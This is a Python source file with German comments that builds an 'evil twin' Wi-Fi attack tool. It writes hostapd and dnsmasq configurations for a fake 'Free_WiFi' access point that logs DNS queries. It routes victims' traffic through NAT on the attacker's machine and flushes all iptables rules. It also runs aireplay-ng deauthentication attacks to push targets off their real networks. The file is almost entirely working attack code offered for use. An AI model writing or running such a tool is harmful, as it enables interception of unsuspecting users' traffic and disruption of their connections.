import os
import subprocess
import logging
import sys

LOG_FILE = "logs/evil_twin.log"

# Logging konfigurieren
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

class EvilTwinWiFi:
    """
    Erstellt einen Evil Twin WiFi Access Point und führt Deauth-Angriffe durch.
    """

    def __init__(self, interface="wlan0", ssid="Free_WiFi", channel="6"):
        self.interface = interface
        self.ssid = ssid
        self.channel = channel
        self.config_path = "config/"
        self.hostapd_conf = os.path.join(self.config_path, "hostapd.conf")
        self.dnsmasq_conf = os.path.join(self.config_path, "dnsmasq.conf")

        # Root-Check
        if os.geteuid() != 0:
            print("Dieses Skript muss als Root ausgeführt werden!")
            sys.exit(1)

        # Abhängigkeiten prüfen
        self.check_dependencies()

        # Config-Ordner erstellen
        os.makedirs(self.config_path, exist_ok=True)

    def check_dependencies(self):
        """
        Prüft, ob alle benötigten Programme installiert sind.
        """
        required = ["hostapd", "dnsmasq", "aireplay-ng", "ifconfig", "iptables", "airmon-ng"]
        for cmd in required:
            if subprocess.call(f"which {cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
                print(f"Fehlende Abhängigkeit: {cmd}. Installiere es mit 'apt install {cmd}'")
                sys.exit(1)

    def setup_fake_ap(self):
        """
        Erstellt die Konfigurationsdateien und startet den Fake Access Point.
        """
        logging.info("Erstelle Fake Access Point mit SSID: %s", self.ssid)

        # hostapd-Konfigurationsdatei schreiben
        with open(self.hostapd_conf, "w") as f:
            f.write(f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
auth_algs=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=freeinternet
""")

        # dnsmasq-Konfigurationsdatei schreiben
        with open(self.dnsmasq_conf, "w") as f:
            f.write(f"""interface={self.interface}
dhcp-range=192.168.1.2,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
""")

        # Internet-Interface automatisch ermitteln
        try:
            internet_interface = subprocess.check_output("ip -4 route show default | awk '{print $5}'", shell=True).decode().strip()
        except subprocess.CalledProcessError:
            logging.error("Fehler: Konnte das Standard-Internet-Interface nicht bestimmen!")
            sys.exit(1)

        # Netzwerk-Interfaces konfigurieren
        os.system(f"ifconfig {self.interface} up 192.168.1.1 netmask 255.255.255.0")
        os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")

        # iptables-Regeln setzen
        os.system("iptables -F")  # Vorherige Regeln löschen
        os.system(f"iptables -t nat -A POSTROUTING -o {internet_interface} -j MASQUERADE")

        # Fake AP starten
        try:
            subprocess.Popen(["hostapd", self.hostapd_conf], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            subprocess.Popen(["dnsmasq", "-C", self.dnsmasq_conf], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            logging.info("Fake Access Point wurde erfolgreich gestartet.")
        except Exception as e:
            logging.error(f"Fehler beim Starten des Fake AP: {str(e)}")
            sys.exit(1)

    def run_deauth_attack(self, target_bssid, target_client):
        """
        Führt eine Deauthentication-Attacke aus, um Opfer aus ihrem echten Netzwerk zu werfen.
        """
        logging.info("Starte Deauth-Attacke gegen %s", target_client)

        # Monitor Mode aktivieren
        os.system(f"airmon-ng start {self.interface}")

        try:
            subprocess.run(f"aireplay-ng --deauth 10 -a {target_bssid} -c {target_client} {self.interface}mon", shell=True, check=True)
            logging.info("Deauth-Attacke erfolgreich gestartet.")
        except subprocess.CalledProcessError:
            logging.error("Fehler bei Deauth-Angriff!")

    def stop(self):
        """
        Beendet alle Prozesse und stellt das Netzwerk zurück.
        """
        os.system("killall hostapd dnsmasq")
        os.system("iptables --flush")
        os.system(f"ifconfig {self.interface} down")
        os.system(f"airmon-ng stop {self.interface}mon")  # Monitor Mode beenden
        logging.info("Fake AP gestoppt und Netzwerk zurückgesetzt.")

if __name__ == "__main__":
    ap = EvilTwinWiFi()
    ap.setup_fake_ap()
